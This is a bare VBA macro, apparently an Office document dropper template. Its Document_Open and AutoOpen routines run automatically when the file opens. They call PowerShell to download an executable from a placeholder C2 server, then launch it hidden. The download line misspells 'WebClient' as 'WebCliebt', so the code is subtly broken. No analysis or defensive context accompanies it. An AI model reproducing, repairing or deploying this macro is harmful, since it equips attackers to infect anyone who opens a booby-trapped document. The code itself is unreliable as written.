Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebCliebt).DownloadFile('payload stored on c2', 'PayloadName.exe')"
    Shell str, vbHide
    Dim exePath As String
    exePath = ActiveDocument.Path + "\PayloadName.exe"
    Wait(2)
    Shell exePath, vbHide
End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
